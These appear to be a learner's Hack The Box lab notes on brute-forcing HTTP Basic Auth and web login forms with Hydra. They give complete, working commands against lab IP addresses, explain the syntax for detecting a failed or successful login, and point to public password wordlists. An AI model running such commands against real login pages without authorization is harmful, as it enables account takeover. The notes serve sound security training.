# Hydra

## Basic HTTP Authentication

### Exploiting Basic Auth with Hydra

We will use the `http-get` hydra service to brute force the basic authentication target.

In this scenario, the spawned target instance employs Basic HTTP Authentication. We already know the username is `basic-auth-user`. Since we know the username, we can simplify the Hydra command and focus solely on brute-forcing the password. Here's the command we'll use:

```shell-session
# Download wordlist if needed
eldeim@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
eldeim@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

Upon execution, Hydra will systematically attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website and retrieve the flag.

### PoCs - Questions

* After successfully brute-forcing, and then logging into the target, what is the full flag you find?

```
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt -s 34967 94.237.55.43 http-get /
```

## Login Forms

### http-post-form

The general structure of a Hydra command using `http-post-form` looks like this:

```shell-session
eldeim@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```

#### Understanding the Condition String

In Hydra’s `http-post-form` module, success and failure conditions are crucial for properly identifying valid and invalid login attempts. Hydra primarily relies on failure conditions (`F=...`) to determine when a login attempt has failed, but you can also specify a success condition (`S=...`) to indicate when a login is successful.

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

In this case, Hydra will check each response for the string "Invalid credentials." If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair. This approach is commonly used because failure messages are usually easy to identify.

However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using HTTP status code `302`), or displays specific content (like "Dashboard" or "Welcome"), you can configure Hydra to look for that success condition using `S=`. Here’s an example where a successful login results in a 302 redirect:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

In this case, Hydra will treat any response that returns an HTTP 302 status code as a successful login. Similarly, if a successful login results in content like "Dashboard" appearing on the page, you can configure Hydra to look for that keyword as a success condition:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

The `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.

* `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.
* `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.
* `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).

Therefore, our `params` string would be:

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

* `"/"`: The path where the form is submitted.
* `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
* `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.

We will be using [top-usernames-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) for the username list, and [2023-200\_most\_used\_passwords.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) for the password list.

This `params` string is incorporated into the Hydra command as follows. Hydra will systematically substitute `^USER^` and `^PASS^` with values from your wordlists, sending POST requests to the target and analyzing the responses for the specified failure condition

### PoCs - Questions

* After successfully brute-forcing, and then logging into the target, what is the full flag you find?

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -s 45367 94.237.54.192 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

